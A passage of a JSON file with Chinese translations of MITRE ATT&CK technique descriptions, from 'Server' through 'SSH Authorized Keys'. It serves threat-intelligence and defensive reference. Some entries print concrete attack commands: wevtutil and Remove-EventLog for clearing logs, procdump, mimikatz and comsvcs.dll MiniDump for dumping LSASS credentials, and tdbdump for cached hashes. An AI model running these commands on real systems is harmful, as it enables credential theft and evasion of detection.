cisco_deploy_rsa_keys)\n\n某些私钥需要密码或口令才能操作，因此对手可能还会使用[输入捕获](https://attack.mitre.org/techniques/T1056)进行键盘记录或尝试离线[暴力破解](https://attack.mitre.org/techniques/T1110)口令。这些私钥可用于身份验证到[远程服务](https://attack.mitre.org/techniques/T1021)（如 SSH）或用于解密其他收集的文件（如电子邮件）。"
    },
    "Server": {
        "translated_name": "服务器",
        "translated_description": "对手可能会破坏可在目标过程中使用的第三方服务器。使用服务器允许对手阶段性、启动和执行操作。在后期妥协活动中，对手可能会利用服务器执行各种任务，包括命令和控制。(引用: TrendMicro EarthLusca 2022) 对手可能会破坏第三方服务器以支持操作，而不是购买[服务器](https://attack.mitre.org/techniques/T1583/004)或[虚拟专用服务器](https://attack.mitre.org/techniques/T1583/003)。\n\n对手还可能破坏 Web 服务器以支持水坑攻击，如[驱动器式妥协](https://attack.mitre.org/techniques/T1189)，或破坏电子邮件服务器以支持[网络钓鱼](https://attack.mitre.org/techniques/T1566)操作。"
    },
    "Windows Remote Management": {
        "translated_name": "Windows 远程管理",
        "translated_description": "对手可能会使用 [有效帐户](https://attack.mitre.org/techniques/T1078) 通过 Windows 远程管理 (WinRM) 与远程系统交互。然后，对手可能会以登录用户的身份执行操作。\n\nWinRM 是一个 Windows 服务和协议的名称，允许用户与远程系统交互（例如，运行可执行文件、修改注册表、修改服务）。（引用：Microsoft WinRM）可以使用 `winrm` 命令或任何数量的程序（如 PowerShell）调用它。（引用：Jacobsen 2014）WinRM 可以用作远程交互 [Windows 管理工具](https://attack.mitre.org/techniques/T1047) 的方法。（引用：MSDN WMI）"
    },
    "Exfiltration Over Bluetooth": {
        "translated_name": "通过蓝牙外传",
        "translated_description": "对手可能会尝试通过蓝牙而不是命令和控制通道外传数据。如果命令和控制网络是有线互联网连接，对手可能会选择使用蓝牙通信通道外传数据。\n\n如果对手有足够的访问权限和接近度，他们可能会选择这样做。蓝牙连接可能没有像主要互联网连接通道那样受到保护或防御，因为它不通过相同的企业网络路由。"
    },
    "Default Accounts": {
        "translated_name": "默认帐户",
        "translated_description": "对手可能会获取和滥用默认帐户的凭据，作为获得初始访问、持久性、权限提升或防御规避的一种手段。默认帐户是内置于操作系统中的帐户，例如 Windows 系统上的来宾或管理员帐户。默认帐户还包括其他类型系统、软件或设备上的默认工厂/提供商设置帐户，包括 AWS 中的 root 用户帐户和 Kubernetes 中的默认服务帐户。（引用：Microsoft 本地帐户 2019 年 2 月）（引用：AWS Root 用户）（引用：Kubernetes 威胁矩阵）\n\n默认帐户不仅限于客户端机器，还包括为设备（如网络设备和计算机应用程序）预设的帐户，无论它们是内部的、开源的还是商业的。安装后未更改的预设用户名和密码组合的设备对组织构成严重威胁，因为它们是对手的容易目标。同样，对手还可能利用公开披露或被盗的 [私钥](https://attack.mitre.org/techniques/T1552/004) 或凭据材料，通过 [远程服务](https://attack.mitre.org/techniques/T1021) 合法连接到远程环境。（引用：Metasploit SSH 模块）"
    },
    "Time Providers": {
        "translated_name": "时间提供者",
        "translated_description": "对手可能会滥用时间提供者在系统启动时执行 DLL。Windows 时间服务 (W32Time) 使域内和域间的时间同步成为可能。（引用：Microsoft W32Time 2018 年 2 月）W32Time 时间提供者负责从硬件/网络资源检索时间戳并将这些值输出到其他网络客户端。（引用：Microsoft TimeProvider）\n\n时间提供者实现为动态链接库 (DLL)，注册在 `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\` 的子键中。（引用：Microsoft TimeProvider）时间提供者管理器由服务控制管理器指挥，在系统启动时和/或参数更改时加载并启动在此键下列出并启用的时间提供者。（引用：Microsoft TimeProvider）\n\n对手可能会滥用此架构来建立持久性，具体方法是创建一个新的任意命名的子键，指向 `DllName` 值中的恶意 DLL。时间提供者注册需要管理员权限，但执行将在本地服务帐户的上下文中运行。（引用：Github W32Time 2017 年 10 月）"
    },
    "Trap": {
        "translated_name": "陷阱",
        "translated_description": "对手可能通过执行由中断信号触发的恶意内容来建立持久性。<code>trap</code> 命令允许程序和 shell 指定在收到中断信号时将执行的命令。一个常见的情况是脚本允许优雅终止和处理常见的键盘中断，如 <code>ctrl+c</code> 和 <code>ctrl+d</code>。\n\n对手可以使用此命令注册代码，以便在 shell 遇到特定中断时执行，作为持久性机制。陷阱命令的格式为 <code>trap '命令列表' 信号</code>，其中“命令列表”将在收到“信号”时执行。（引用：Trap 手册）（引用：Cyberciti Trap 语句）"
    },
    "Dynamic Linker Hijacking": {
        "translated_name": "动态链接器劫持",
        "translated_description": "对手可能通过劫持动态链接器用于加载共享库的环境变量来执行他们自己的恶意负载。在程序的执行准备阶段，动态链接器从环境变量和文件（如 Linux 上的 <code>LD_PRELOAD</code> 或 macOS 上的 <code>DYLD_INSERT_LIBRARIES</code>）加载指定的共享库的绝对路径。环境变量中指定的库首先加载，优先于具有相同函数名称的系统库。（引用：Man LD.SO）（引用：TLDP 共享库）（引用：Apple Doco Archive 动态库）这些变量通常由开发人员用于调试二进制文件而无需重新编译、解决映射符号冲突以及在不更改原始库的情况下实现自定义函数。（引用：Baeldung LD_PRELOAD）\n\n在 Linux 和 macOS 上，劫持动态链接器变量可能会授予对受害者进程内存、系统/网络资源的访问权限，并可能提升权限。此方法还可能规避安全产品的检测，因为执行被掩盖在合法进程下。对手可以使用 <code>export</code> 命令、<code>setenv</code> 函数或 <code>putenv</code> 函数通过命令行设置环境变量。对手还可以利用 [动态链接器劫持](https://attack.mitre.org/techniques/T1574/006) 在 shell 中导出变量或使用更高级别的语法（如 Python 的 <code>os.environ</code>）以编程方式设置变量。\n\n在 Linux 上，对手可能会设置 <code>LD_PRELOAD</code> 以指向与受害者程序请求的合法库名称匹配的恶意库，从而导致操作系统在执行受害者程序时加载对手的恶意代码。<code>LD_PRELOAD</code> 可以通过环境变量或 <code>/etc/ld.so.preload</code> 文件设置。（引用：Man LD.SO）（引用：TLDP 共享库）由 <code>LD_PRELOAD</code> 指定的库由 <code>dlopen()</code> 和 <code>mmap()</code> 分别加载和映射到内存中。（引用：Linux 和 macOS 上的代码注入）（引用：Uninformed Needle）（引用：Phrack halfdead 1997）（引用：Brown Exploiting Linkers）\n\n在 macOS 上，此行为在概念上与 Linux 上相同，只是在较低级别上实现 macOS 动态库（dyld）有所不同。对手可以设置 <code>DYLD_INSERT_LIBRARIES</code> 环境变量以指向包含受害者程序请求的合法库或函数名称的恶意库。（引用：TheEvilBit DYLD_INSERT_LIBRARIES）（引用：Timac DYLD_INSERT_LIBRARIES）（引用：Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass）"
    },
    "Communication Through Removable Media": {
        "translated_name": "通过可移动媒体通信",
        "translated_description": "对手可以使用可移动媒体在可能断开的网络上在受损主机之间执行命令和控制。（引用：ESET Sednit USBStealer 2014）两个系统都需要被破坏，可能是通过 [通过可移动媒体复制](https://attack.mitre.org/techniques/T1091) 从互联网连接的系统首先被破坏，然后通过横向移动到第二个系统。命令和文件将从断开连接的系统中继到对手直接访问的互联网连接系统。"
    },
    "Clear Windows Event Logs": {
        "translated_name": "清除 Windows 事件日志",
        "translated_description": "对手可能会清除 Windows 事件日志以隐藏入侵活动。Windows 事件日志是计算机警报和通知的记录。系统定义了三个事件源：系统、应用程序和安全性，具有五种事件类型：错误、警告、信息、成功审核和失败审核。\n\n\n具有管理员权限，可以使用以下实用程序命令清除事件日志：\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\n这些日志也可以通过其他机制清除，例如事件查看器 GUI 或 [PowerShell](https://attack.mitre.org/techniques/T1059/001)。例如，对手可能会使用 PowerShell 命令 <code>Remove-EventLog -LogName Security</code> 删除安全事件日志，并在重启后禁用未来的日志记录。注意：在运行命令和重启之间的时间内，事件可能仍会生成并记录在 .evtx 文件中。（引用：disable_win_evt_logging）\n\n对手还可能尝试通过直接删除存储在 `C:\\Windows\\System32\\winevt\\logs\\` 中的日志文件来清除日志。"
    },
    "LLMNR/NBT-NS Poisoning and SMB Relay": {
        "translated_name": "LLMNR/NBT-NS 中毒和 SMB 中继",
        "translated_description": "通过响应 LLMNR/NBT-NS 网络流量，对手可能会伪装成权威的名称解析源，以强制与对手控制的系统进行通信。这种活动可能用于收集或中继身份验证材料。\n\n链路本地多播名称解析 (LLMNR) 和 NetBIOS 名称服务 (NBT-NS) 是 Microsoft Windows 组件，作为主机标识的替代方法。LLMNR 基于域名系统 (DNS) 格式，允许同一本地链路上的主机为其他主机执行名称解析。NBT-NS 通过其 NetBIOS 名称识别本地网络上的系统。(引用: Wikipedia LLMNR)(引用: TechNet NetBIOS)\n\n对手可以通过响应 LLMNR (UDP 5355)/NBT-NS (UDP 137) 流量，伪装成受害者网络中请求主机的权威名称解析源，有效地毒害服务，使受害者与对手控制的系统通信。如果请求的主机属于需要身份验证的资源，则用户名和 NTLMv2 哈希将发送到对手控制的系统。然后，对手可以通过监控端口流量的工具或通过[网络嗅探](https://attack.mitre.org/techniques/T1040)收集通过网络发送的哈希信息，并通过[暴力破解](https://attack.mitre.org/techniques/T1110)离线破解哈希以获取明文密码。\n\n在某些情况下，如果对手可以访问系统，该系统位于系统之间的身份验证路径中，或者当使用凭据的自动扫描尝试对对手控制的系统进行身份验证时，可以拦截并中继 NTLMv1/v2 哈希以访问和对目标系统执行代码。中继步骤可以与中毒结合发生，但也可以独立发生。(引用: byt3bl33d3r NTLM Relaying)(引用: Secure Ideas SMB Relay) 此外，对手可能会将 NTLMv1/v2 哈希封装到各种协议中，例如 LDAP、SMB、MSSQL 和 HTTP，以扩展并使用带有有效 NTLM 响应的多个服务。\n\n可以使用多种工具在本地网络中毒害名称服务，例如 NBNSpoof、Metasploit 和[Responder](https://attack.mitre.org/software/S0174)。(引用: GitHub NBNSpoof)(引用: Rapid7 LLMNR Spoofer)(引用: GitHub Responder)"
    },
    "File and Directory Permissions Modification": {
        "translated_name": "文件和目录权限修改",
        "translated_description": "对手可能会修改文件或目录权限/属性，以规避访问控制列表 (ACL) 并访问受保护的文件。(引用: Hybrid Analysis Icacls1 June 2018)(引用: Hybrid Analysis Icacls2 May 2018) 文件和目录权限通常由文件或目录所有者或具有适当权限的用户通过 ACL 管理。文件和目录 ACL 实现因平台而异，但通常明确指定哪些用户或组可以执行哪些操作（读取、写入、执行等）。\n\n修改可能包括更改特定的访问权限，这可能需要获取文件或目录的所有权和/或提升权限，具体取决于文件或目录的现有权限。这可能会启用恶意活动，例如修改、替换或删除特定文件或目录。特定文件和目录的修改可能是许多技术的必要步骤，例如通过[辅助功能](https://attack.mitre.org/techniques/T1546/008)、[启动或登录初始化脚本](https://attack.mitre.org/techniques/T1037)、[Unix Shell 配置修改](https://attack.mitre.org/techniques/T1546/004)建立持久性，或通过[劫持执行流](https://attack.mitre.org/techniques/T1574)污染/劫持其他重要的二进制/配置文件。\n\n对手还可能更改符号链接的权限。例如，恶意软件（特别是勒索软件）可能会修改符号链接及其相关设置，以启用从具有远程路径的本地快捷方式访问文件。(引用: new_rust_based_ransomware)(引用: bad_luck_blackcat)(引用: falconoverwatch_blackcat_attack)(引用: blackmatter_blackcat)(引用: fsutil_behavior)"
    },
    "LSASS Memory": {
        "translated_name": "LSASS 内存",
        "translated_description": "对手可能会尝试访问本地安全机构子系统服务 (LSASS) 的进程内存中存储的凭据材料。用户登录后，系统会在 LSASS 进程内存中生成并存储各种凭据材料。管理员用户或 SYSTEM 可以收集这些凭据材料，并使用它们通过[使用替代身份验证材料](https://attack.mitre.org/techniques/T1550)进行[横向移动](https://attack.mitre.org/tactics/TA0008)。\n\n除了内存中的技术外，还可以从目标主机转储 LSASS 进程内存，并在本地系统上进行分析。\n\n例如，在目标主机上使用 procdump：\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\n在本地，可以运行 mimikatz：\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\n也可以使用内置的 Windows 工具，如 `comsvcs.dll`：\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID lsass.dmp full</code>(引用: Volexity Exchange Marauder March 2021)(引用: Symantec Attacks Against Government Sector)\n\n类似于[图像文件执行选项注入](https://attack.mitre.org/techniques/T1546/012)，可以滥用静默进程退出机制，通过 Windows 错误报告 (`WerFault.exe`) 创建 `lsass.exe` 的内存转储。(引用: Deep Instinct LSASS)\n\nWindows 安全支持提供程序 (SSP) DLL 在系统启动时加载到 LSASS 进程中。一旦加载到 LSA 中，SSP DLL 就可以访问存储在 Windows 中的加密和明文密码，例如任何登录用户的域密码或智能卡 PIN。SSP 配置存储在两个注册表项中：<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> 和 <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>。对手可能会修改这些注册表项以添加新的 SSP，这些 SSP 将在系统下次启动时加载，或者在调用 AddSecurityPackage Windows API 函数时加载。(引用: Graeber 2014)\n\n以下 SSP 可用于访问凭据：\n\n* Msv：交互式登录、批处理登录和服务登录通过 MSV 身份验证包完成。\n* Wdigest：摘要身份验证协议设计用于超文本传输协议 (HTTP) 和简单身份验证安全层 (SASL) 交换。(引用: TechNet Blogs Credential Protection)\n* Kerberos：首选用于 Windows 2000 及更高版本中的客户端-服务器域身份验证。\n* CredSSP：为远程桌面服务提供单点登录和网络级别身份验证。(引用: TechNet Blogs Credential Protection)"
    },
    "Active Scanning": {
        "translated_name": "主动扫描",
        "translated_description": "对手可能会执行主动侦察扫描，以收集可用于目标过程的信息。主动扫描是指对手通过网络流量探测受害者基础设施，而不是其他不涉及直接交互的侦察形式。\n\n对手可能会根据他们希望收集的信息执行不同形式的主动扫描。这些扫描可以通过各种方式进行，包括使用网络协议的本机功能，例如 ICMP。(引用: Botnet Scan)(引用: OWASP Fingerprinting) 来自这些扫描的信息可能会揭示其他形式的侦察机会（例如：[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)或[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596)），建立操作资源（例如：[开发能力](https://attack.mitre.org/techniques/T1587)或[获取能力](https://attack.mitre.org/techniques/T1588)），和/或初始访问（例如：[外部远程服务](https://attack.mitre.org/techniques/T1133)或[利用面向公众的应用程序](https://attack.mitre.org/techniques/T1190)）。"
    },
    "Abuse Elevation Control Mechanism": {
        "translated_name": "滥用提升控制机制",
        "translated_description": "对手可能会绕过旨在控制提升权限的机制，以获得更高级别的权限。大多数现代系统包含本机提升控制机制，旨在限制用户在计算机上执行的权限。必须授权特定用户才能执行被认为具有较高风险的任务。(引用: TechNet How UAC Works)(引用: sudo man page 2018) 对手可以通过多种方法利用内置控制机制，以在系统上提升权限。(引用: OSX Keydnap malware)(引用: Fortinet Fareit)"
    },
    "Create Process with Token": {
        "translated_name": "使用令牌创建进程",
        "translated_description": "对手可能会使用现有令牌创建新进程，以提升权限并绕过访问控制。可以使用 <code>CreateProcessWithTokenW</code> 和 <code>runas</code> 等功能创建具有另一个用户令牌和结果安全上下文的进程。(引用: Microsoft RunAs)\n\n使用与当前用户不关联的令牌创建进程可能需要目标用户的凭据、模拟该用户的特定权限或访问要使用的令牌。例如，可以通过[令牌模拟/盗用](https://attack.mitre.org/techniques/T1134/001)复制令牌或通过[创建和模拟令牌](https://attack.mitre.org/techniques/T1134/003)创建令牌，然后使用它来创建进程。\n\n虽然此技术与[令牌模拟/盗用](https://attack.mitre.org/techniques/T1134/001)不同，但可以结合使用这些技术，其中令牌被复制，然后用于创建新进程。"
    },
    "Setuid and Setgid": {
        "translated_name": "Setuid 和 Setgid",
        "translated_description": "对手可能会滥用配置，其中应用程序设置了 setuid 或 setgid 位，以便在不同（可能更高级别）用户的上下文中运行代码。在 Linux 或 macOS 上，当为应用程序二进制文件设置 setuid 或 setgid 位时，应用程序将以拥有用户或组的权限运行。(引用: setuid man page) 通常，应用程序在当前用户的上下文中运行，无论哪个用户或组拥有应用程序。然而，在某些情况下，程序需要在提升的上下文中执行才能正常运行，但运行它们的用户可能没有特定的所需权限。\n\n与在 sudoers 文件中创建条目不同，这必须由 root 完成，任何用户都可以指定为自己的应用程序设置 setuid 或 setgid 标志（即[Linux 和 Mac 文件和目录权限修改](https://attack.mitre.org/techniques/T1222/002)）。可以使用位掩码通过 <code>chmod</code> 命令设置这些位，<code>chmod 4777 [file]</code> 或通过简写命名，<code>chmod u+s [file]</code>。这将启用 setuid 位。要启用 setgid 位，可以使用 <code>chmod 2775</code> 和 <code>chmod g+s</code>。\n\n对手可以在自己的恶意软件上使用此机制，以确保他们能够在未来的提升上下文中执行。(引用: OSX Keydnap malware) 这种滥用通常是“shell 逃逸”或其他绕过具有受限权限的执行环境的操作的一部分。\n\n或者，对手可能会选择查找和目标具有已启用 setuid 或 setgid 位的易受攻击的二进制文件（即[文件和目录发现](https://attack.mitre.org/techniques/T1083)）。通过 <code>ls -l</code> 查看文件属性时，setuid 和 setgid 位用“s”而不是“x”表示。<code>find</code> 命令也可以用于搜索此类文件。例如，<code>find / -perm +4000 2>/dev/null</code> 可用于查找设置了 setuid 的文件，<code>find / -perm +2000 2>/dev/null</code> 可用于查找设置了 setgid 的文件。然后，对手可能会滥用这些位已设置的二进制文件。(引用: GTFOBins Suid)"
    },
    "Winlogon Helper DLL": {
        "translated_name": "Winlogon 助手 DLL",
        "translated_description": "对手可能会滥用 Winlogon 的功能，在用户登录时执行 DLL 和/或可执行文件。Winlogon.exe 是一个 Windows 组件，负责登录/注销时的操作以及由 Ctrl-Alt-Delete 触发的安全注意序列 (SAS)。<code>HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> 和 <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> 中的注册表项用于管理支持 Winlogon 的其他助手程序和功能。(引用: Cylance Reg Persistence Sept 2013)\n\n对这些注册表项的恶意修改可能会导致 Winlogon 加载并执行恶意 DLL 和/或可执行文件。具体来说，以下子键可能容易被滥用：(引用: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify - 指向处理 Winlogon 事件的通知包 DLL\n* Winlogon\\Userinit - 指向 userinit.exe，用户登录时执行的用户初始化程序\n* Winlogon\\Shell - 指向 explorer.exe，用户登录时执行的系统 shell\n\n对手可能会利用这些功能反复执行恶意代码并建立持久性。"
    },
    "Distributed Component Object Model": {
        "translated_name": "分布式组件对象模型",
        "translated_description": "对手可能会使用[有效帐户](https://attack.mitre.org/techniques/T1078)通过分布式组件对象模型 (DCOM) 与远程计算机交互。然后，对手可能会以登录用户的身份执行操作。\n\nWindows 组件对象模型 (COM) 是本机 Windows 应用程序编程接口 (API) 的一个组件，允许软件对象之间进行交互，或实现一个或多个接口的可执行代码。通过 COM，客户端对象可以调用服务器对象的方法，服务器对象通常是动态链接库 (DLL) 或可执行文件 (EXE)。分布式 COM (DCOM) 是一种透明的中间件，使用远程过程调用 (RPC) 技术扩展了 COM 的功能，使其超越本地计算机。(引用: Fireeye Hunting COM June 2019)(引用: Microsoft COM)\n\n与本地和远程服务器 COM 对象交互的权限由注册表中的访问控制列表 (ACL) 指定。(引用: Microsoft Process Wide Com Keys) 默认情况下，只有管理员可以通过 DCOM 远程激活和启动 COM 对象。(引用: Microsoft COM ACL)\n\n通过 DCOM，在适当权限用户的上下文中操作的对手可以通过 Office 应用程序(引用: Enigma Outlook DCOM Lateral Movement Nov 2017) 以及包含不安全方法的其他 Windows 对象(引用: Enigma MMC20 COM Jan 2017)(引用: Enigma DCOM Lateral Movement Jan 2017) 远程获取任意甚至直接的 shellcode 执行。DCOM 还可以在现有文档中执行宏(引用: Enigma Excel DCOM Sept 2017)，并且还可以通过 COM 创建的 Microsoft Office 应用程序实例直接调用[动态数据交换](https://attack.mitre.org/techniques/T1559/002) (DDE) 执行(引用: Cyberreason DCOM DDE Lateral Movement Nov 2017)，无需恶意文档。DCOM 可以用作远程与[Windows 管理工具](https://attack.mitre.org/techniques/T1047) 交互的方法。(引用: MSDN WMI)"
    },
    "Password Spraying": {
        "translated_name": "密码喷射",
        "translated_description": "对手可能会使用单个或少量常用密码对许多不同帐户进行尝试，以获取有效的帐户凭据。密码喷射使用一个密码（例如 'Password01'）或少量常用密码，这些密码可能符合域的复杂性策略。使用该密码对网络上的许多不同帐户进行登录尝试，以避免在使用许多密码对单个帐户进行暴力破解时通常会发生的帐户锁定。(引用: BlackHillsInfosec Password Spraying)\n\n通常，在常用端口上使用管理服务时会进行密码喷射。常见的目标服务包括以下内容：\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / 终端服务 (3389/TCP)\n* HTTP/HTTP 管理服务 (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\n除了管理服务外，对手还可能“针对使用联合身份验证协议的单点登录 (SSO) 和基于云的应用程序”，以及外部电子邮件应用程序，例如 Office 365。(引用: US-CERT TA18-068A 2018)\n\n在默认环境中，LDAP 和 Kerberos 连接尝试比 SMB 更不容易触发事件，后者会创建 Windows “登录失败”事件 ID 4625。"
    },
    "External Proxy": {
        "translated_name": "外部代理",
        "translated_description": "对手可能会使用外部代理作为网络通信到命令和控制服务器的中介，以避免直接连接到他们的基础设施。许多工具可以通过代理或端口重定向实现流量重定向，包括 [HTRAN](https://attack.mitre.org/software/S0040)、ZXProxy 和 ZXPortMap。(引用: Trend Micro APT Attack Tools) 对手使用这些类型的代理来管理命令和控制通信，以在连接丢失的情况下提供弹性，或通过现有的受信任通信路径进行通信以避免引起怀疑。\n\n外部连接代理用于掩盖 C2 流量的目的地，通常通过端口重定向器实现。受害者环境外的受损系统可能用于这些目的，也可能是购买的基础设施，例如基于云的资源或虚拟专用服务器。代理可能会根据受害系统连接到它们的可能性较低而被选择。受害系统将直接与互联网上的外部代理通信，然后代理将通信转发到 C2 服务器。"
    },
    "Web Portal Capture": {
        "translated_name": "Web 门户捕获",
        "translated_description": "对手可能会在外部门户（例如 VPN 登录页面）上安装代码，以捕获和传输尝试登录服务的用户的凭据。例如，受损的登录页面可能会在用户登录服务之前记录提供的用户凭据。\n\n这种输入捕获的变体可能在利用合法管理访问权限后进行，以作为通过[外部远程服务](https://attack.mitre.org/techniques/T1133)和[有效帐户](https://attack.mitre.org/techniques/T1078)保持网络访问的备用措施，或作为通过利用外部 Web 服务进行初始妥协的一部分。(引用: Volexity Virtual Private Keylogging)"
    },
    "Email Addresses": {
        "translated_name": "电子邮件地址",
        "translated_description": "对手可能会收集可用于目标过程的电子邮件地址。即使存在内部实例，组织也可能拥有面向公众的电子邮件基础设施和员工的电子邮件地址。\n\n对手可能很容易收集电子邮件地址，因为它们可能通过在线或其他可访问的数据集（例如[社交媒体](https://attack.mitre.org/techniques/T1593/001)或[搜索受害者拥有的网站](https://attack.mitre.org/techniques/T1594)）公开并暴露。(引用: HackersArise Email)(引用: CNET Leaks) 电子邮件地址也可以通过更积极的手段（即[主动扫描](https://attack.mitre.org/techniques/T1595)）枚举，例如探测和分析身份验证服务的响应，这些响应可能会揭示系统中的有效用户名。(引用: GrimBlog UsernameEnum) 例如，对手可能能够通过查询各种公开可用的 API 端点（例如 autodiscover 和 GetCredentialType）在 Office 365 环境中枚举电子邮件地址。(引用: GitHub Office 365 User Enumeration)(引用: Azure Active Directory Reconnaisance)\n\n收集这些信息可能会揭示其他形式的侦察机会（例如[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)或[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)），建立操作资源（例如[电子邮件帐户](https://attack.mitre.org/techniques/T1586/002)），和/或初始访问（例如[网络钓鱼](https://attack.mitre.org/techniques/T1566)或通过[外部远程服务](https://attack.mitre.org/techniques/T1133)进行[暴力破解](https://attack.mitre.org/techniques/T1110)）。"
    },
    "Spearphishing Voice": {
        "translated_name": "语音鱼叉式网络钓鱼",
        "translated_description": "对手可能会使用语音通信最终获得对受害者系统的访问权限。语音鱼叉式网络钓鱼是鱼叉式网络钓鱼的一种特定变体。它与其他形式的鱼叉式网络钓鱼不同，因为它使用操纵用户通过电话或其他形式的语音通信提供系统访问权限。鱼叉式网络钓鱼通常涉及社会工程技术，例如冒充可信来源（例如[冒充](https://attack.mitre.org/techniques/T1656)）和/或为接收者制造紧迫感或警报。\n\n所有形式的网络钓鱼都是电子传递的社会工程。在这种情况下，对手不会直接向受害者发送恶意软件，而是依赖[用户执行](https://attack.mitre.org/techniques/T1204)进行传递和执行。例如，受害者可能会收到网络钓鱼消息，指示他们拨打一个电话号码，在那里他们被引导访问恶意 URL、下载恶意软件，(引用: sygnia Luna Month)(引用: CISA Remote Monitoring and Management Software) 或在其计算机上安装对手可访问的远程管理工具（[远程访问软件](https://attack.mitre.org/techniques/T1219)）。(引用: Unit42 Luna Moth)\n\n对手还可能将语音钓鱼与[多因素认证请求生成](https://attack.mitre.org/techniques/T1621)结合使用，以诱骗用户透露 MFA 凭据或接受身份验证提示。(引用: Proofpoint Vishing)"
    },
    "Cached Domain Credentials": {
        "translated_name": "缓存的域凭据",
        "translated_description": "对手可能会尝试访问缓存的域凭据，以便在域控制器不可用的情况下允许进行身份验证。(引用: Microsoft - Cached Creds)\n\n在 Windows Vista 及更高版本上，哈希格式为 DCC2（域缓存凭据版本 2）哈希，也称为 MS-Cache v2 哈希。(引用: PassLib mscache) 默认缓存的凭据数量各不相同，可以按系统进行更改。此哈希不允许传递哈希样式攻击，而是需要[密码破解](https://attack.mitre.org/techniques/T1110/002)来恢复明文密码。(引用: ired mscache)\n\n在 Linux 系统上，可以通过 System Security Services Daemon (SSSD) 或 Quest Authentication Services（前身为 VAS）等软件访问 Active Directory 凭据。缓存的凭据哈希通常位于 `/var/lib/sss/db/cache.[domain].ldb`（用于 SSSD）或 `/var/opt/quest/vas/authcache/vas_auth.vdb`（用于 Quest）。对手可以在这些数据库文件上使用 `tdbdump` 等实用程序转储缓存的哈希，并使用[密码破解](https://attack.mitre.org/techniques/T1110/002)获取明文密码。(引用: Brining MimiKatz to Unix)\n\n具有 SYSTEM 或 sudo 访问权限的工具/实用程序，例如 [Mimikatz](https://attack.mitre.org/software/S0002)、[Reg](https://attack.mitre.org/software/S0075) 和 Windows 的 secretsdump.py 或 Linux 的 Linikatz 可用于提取缓存的凭据。(引用: Brining MimiKatz to Unix)\n\n注意：Windows Vista 的缓存凭据是使用 PBKDF2 派生的。(引用: PassLib mscache)"
    },
    "SSH Authorized Keys": {
        "translated_name": "SSH 授权密钥",
        "translated_description": "对手可能会修改 SSH <code>authorized_keys</code> 文件以在受害者主机上保持持久性。Linux 发行版和 macOS 通常使用基于密钥的身份验证来保护 SSH 会话的身份验证过程以进行远程管理。SSH 中的 <code>authorized_keys</code> 文件指定可用于登录配置该文件的用户帐户的 SSH 密钥。此文件通常位于用户主目录下的 <code>&lt;user-home&gt;/.ssh/authorized_keys</code>。(引用: SSH Authorized Keys) 用户可以编辑系统的 SSH 配置文件，将指令 PubkeyAuthentication 和 RSAAuthentication 修改为值“yes”以确保启用公钥和 RSA 身份验证。SSH 配置文件通常位于 <code>/etc/ssh/sshd_config</code> 下。\n\n对手可能会直接使用脚本或 shell 命令修改 SSH <code>authorized_keys</code> 文件以添加他们自己提供的公钥。在云环境中，对手可能能够通过命令行界面或 REST API 修改特定虚拟机的 SSH authorized_keys 文件。例如，通过使用 Google Cloud CLI 的“add-metadata”命令，对手可以向用户帐户添加 SSH 密钥。(引用: Google Cloud Add Metadata)(引用: Google Cloud Privilege Escalation) 类似地，在 Azure 中，对手可以通过向 API 发送 PATCH 请求来更新虚拟机的 authorized_keys 文件。(引用: Azure Update Virtual Machines) 这确保了拥有相应私钥的对手可以通过 SSH 以现有用户身份登录。(引用: Venafi SSH Key Abuse)(引用: Cybereason Linux Exim Worm) 这也可能导致权限提升，其中虚拟机或实例具有与请求用户不同的权限。\n\n如果通过云 API 或命令行界面修改 authorized_keys 文件，对手可能会在目标虚拟机上实现权限提升，如果他们向更高权限的用户添加密钥。\n\nSSH 密钥也可以添加到网络设备上的帐户，例如使用 `ip ssh pubkey-chain` [网络设备 CLI](https://attack.mitre.org/techniques/T1059/008) 命令。(引用: cisco_ip_ssh_pubkey_ch_cmd)"
    },
    "Network Security Appliances": {
        "translated_name": "网络安全设备",
        "translated_description": "对手可能会收集有关受害者网络安全设备的信息，以便在目标过程中使用。有关网络安全设备的信息可能包括各种详细信息，例如已部署的防火墙、内容过滤器和代理/堡垒主机的存在和具体情况。对手还可能针对受害者网络入侵检测系统 (NIDS) 或其他与防御性网络安全操作相关的设备信息。\n\n对手可能通过各种方式收集这些信息，例如通过[主动扫描](https://attack.mitre.org/techniques/T1595)或[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)进行直接收集。(引用: Nmap Firewalls NIDS) 有关网络安全设备的信息也可能通过在线或其他可访问的数据集（例如[搜索受害者拥有的网站](https://attack.mitre.org/techniques/T1594)）暴露给对手。收集这些信息可能会揭示其他形式的侦察机会（例如[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596)或[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)），建立操作资源（例如[开发能力](https://attack.mitre.org/techniques/T1587)或[获取能力](https://attack.mitre.org/techniques/T1588)），和/或初始访问（例如[外部远程服务](https://attack.mitre.org/techniques/T1133)）。"
    },
    "Image File Execution Options Injection": {
        "translated_name": "图像文件执行选项注入",
